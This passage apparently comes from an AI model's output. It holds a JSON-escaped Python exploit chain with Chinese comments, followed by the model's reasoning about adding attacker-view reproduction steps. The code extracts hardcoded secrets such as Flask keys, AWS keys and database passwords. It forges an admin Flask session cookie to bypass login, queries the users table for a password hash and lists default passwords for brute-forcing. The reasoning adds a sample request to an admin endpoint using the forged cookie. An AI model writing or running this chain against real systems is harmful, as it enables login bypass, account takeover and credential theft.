\\"\\"\\"扫描指定源码文件，提取硬编码的敏感凭据\\"\\"\\"\\n    credentials = {}\\n    # 匹配常见敏感关键字的正则\\n    patterns = {\\n        \\"FLASK_SECRET_KEY\\": r\'FLASK_SECRET_KEY\\\\s*=\\\\s*\\"([^\\"]+)\\"\',\\n        \\"API_KEY\\": r\'API_KEY\\\\s*=\\\\s*\\"([^\\"]+)\\"\',\\n        \\"DB_PASSWORD\\": r\'DB_PASSWORD\\\\s*=\\\\s*\\"([^\\"]+)\\"\',\\n        \\"DATABASE_URL\\": r\'DATABASE_URL\\\\s*=\\\\s*\\"([^\\"]+)\\"\',\\n        \\"AWS_ACCESS_KEY_ID\\": r\'AWS_ACCESS_KEY_ID\\\\s*=\\\\s*\\"([^\\"]+)\\"\',\\n        \\"AWS_SECRET_ACCESS_KEY\\": r\'AWS_SECRET_ACCESS_KEY\\\\s*=\\\\s*\\"([^\\"]+)\\"\',\\n        \\"DEFAULT_PASSWORDS\\": r\'DEFAULT_PASSWORDS\\\\s*=\\\\s*\\\\[([^\\\\]]+)\\\\]\'\\n    }\\n    for file_path in file_paths:\\n        try:\\n            with open(file_path, \\"r\\", encoding=\\"utf-8\\") as f:\\n                content = f.read()\\n                for key, pattern in patterns.items():\\n                    match = re.search(pattern, content)\\n                    if match:\\n                        if key == \\"DEFAULT_PASSWORDS\\":\\n                            # 解析密码列表\\n                            pwd_str = match.group(1)\\n                            credentials[key] = [p.strip().strip(\\"\'\\") for p in pwd_str.split(\\",\\")]\\n                        elif key == \\"DATABASE_URL\\":\\n                            # 解析数据库连接串，提取密码\\n                            url = match.group(1)\\n                            pwd_match = re.search(r\\":([^@]+)@\\", url)\\n                            if pwd_match:\\n                                credentials[\\"DB_PASSWORD_FROM_URL\\"] = pwd_match.group(1)\\n                                credentials[\\"DATABASE_URL\\"] = url\\n                        else:\\n                            credentials[key] = match.group(1)\\n        except FileNotFoundError:\\n            print(f\\"文件 {file_path} 不存在，跳过扫描\\")\\n    return credentials\\n\\n# -------------------------- 2. Flask Session伪造模块 --------------------------\\ndef forge_flask_session(secret_key, payload):\\n    \\"\\"\\"\\n    利用提取的FlASK_SECRET_KEY伪造Session\\n    :param secret_key: 提取到的Flask secret_key\\n    :param payload: 要写入Session的伪造数据，如{\\"user_id\\": 1, \\"role\\": \\"admin\\"}\\n    :return: 伪造的Session Cookie值\\n    \\"\\"\\"\\n    # 初始化Flask Session序列化器\\n    serializer = URLSafeTimedSerializer(\\n        secret_key=secret_key,\\n        salt=\\"cookie-session\\",\\n        serializer=SecureCookieSessionInterface().serializer\\n    )\\n    # 生成伪造的Session Cookie\\n    forged_cookie = serializer.dumps(payload)\\n    return forged_cookie\\n\\n# -------------------------- 3. 数据库凭据验证模块 --------------------------\\ndef verify_db_credentials(db_url):\\n    \\"\\"\\"验证提取到的数据库凭据是否可用\\"\\"\\"\\n    try:\\n        # 这里以MySQL为例，实际可根据DATABASE_URL类型切换驱动\\n        import pymysql\\n        # 解析连接参数\\n        match = re.match(r\\"mysql\\\\+pymysql://([^:]+):([^@]+)@([^:]+):(\\\\d+)/(.+)\\", db_url)\\n        if not match:\\n            return {\\"status\\": \\"error\\", \\"msg\\": \\"数据库连接串格式错误\\"}\\n        user, pwd, host, port, db = match.groups()\\n        # 尝试连接数据库\\n        conn = pymysql.connect(\\n            host=host,\\n            port=int(port),\\n            user=user,\\n            password=pwd,\\n            database=db,\\n            connect_timeout=5\\n        )\\n        cursor = conn.cursor()\\n        cursor.execute(\\"SELECT username, password FROM users LIMIT 1\\")\\n        result = cursor.fetchone()\\n        conn.close()\\n        return {\\n            \\"status\\": \\"success\\",\\n            \\"msg\\": \\"数据库连接成功，获取到用户数据\\",\\n            \\"data\\": {\\"username\\": result[0], \\"password_hash\\": result[1]}\\n        }\\n    except ImportError:\\n        return {\\"status\\": \\"error\\", \\"msg\\": \\"未安装pymysql驱动，请先执行pip install pymysql\\"}\\n    except Exception as e:\\n        return {\\"status\\": \\"error\\", \\"msg\\": f\\"数据库连接失败：{str(e)}\\"}\\n\\n# -------------------------- 主程序：漏洞验证流程 --------------------------\\nif __name__ == \\"__main__\\":\\n    # 待扫描的源码文件路径（根据实际项目路径修改）\\n    target_files = [\\"app.py\\", \\"config.py\\"]\\n    \\n    # 步骤1：提取硬编码凭据\\n    print(\\"=== 步骤1：扫描源码提取硬编码凭据 ===\\")\\n    creds = extract_hardcoded_credentials(target_files)\\n    print(\\"提取到的敏感信息：\\")\\n    print(json.dumps(creds, indent=4, ensure_ascii=False))\\n    \\n    # 步骤2：验证Flask密钥可利用性（伪造管理员Session）\\n    if \\"FLASK_SECRET_KEY\\" in creds:\\n        print(\\"\\\\n=== 步骤2：伪造Flask管理员Session ===\\")\\n        # 伪造管理员登录态\\n        admin_payload = {\\"user_id\\": 1, \\"username\\": \\"admin\\", \\"role\\": \\"admin\\", \\"logged_in\\": True}\\n        forged_cookie = forge_flask_session(creds[\\"FLASK_SECRET_KEY\\"], admin_payload)\\n        print(f\\"伪造的Session Cookie值：{forged_cookie}\\")\\n        print(\\"利用方式：将Cookie中session字段设置为上述值，即可绕过登录访问管理员接口\\")\\n    \\n    # 步骤3：验证数据库凭据可利用性\\n    if \\"DATABASE_URL\\" in creds:\\n        print(\\"\\\\n=== 步骤3：验证数据库凭据可用性 ===\\")\\n        db_result = verify_db_credentials(creds[\\"DATABASE_URL\\"])\\n        print(json.dumps(db_result, indent=4, ensure_ascii=False))\\n    \\n    # 步骤4：输出默认弱密码列表，可用于暴力破解\\n    if \\"DEFAULT_PASSWORDS\\" in creds:\\n        print(\\"\\\\n=== 步骤4：提取到默认弱密码列表，可用于登录接口爆破 ===\\")\\n        print(f\\"弱密码列表：{creds[\'DEFAULT_PASSWORDS\']}\\")"\n}\n等下，检查一下JSON的格式，有没有语法错误，比如引号有没有转义对，比如代码里的反斜杠有没有问题，比如正则里的\\s，在JSON字符串里要写成\\\\s，对的，刚才的代码里已经转义了。\n还有，reproduce_steps里的内容有没有符合要求，是从攻击者视角的分步复现，含触发请求/输入样例？哦，对了，用户要求里说“含触发请求/输入样例”，刚才的复现步骤里是不是要加？比如扫描的时候的命令行输入样例，还有伪造session之后的请求样例？\n哦，对，刚才的reproduce_steps里可以加一下，比如步骤2里的扫描命令样例，步骤4里的利用请求样例，比如用伪造的session访问接口的请求样例，比如：\n在步骤4的a里，加“请求样例：`GET /api/admin HTTP/1.1\\nHost: target.com\\nCookie: session=伪造的Cookie值`”\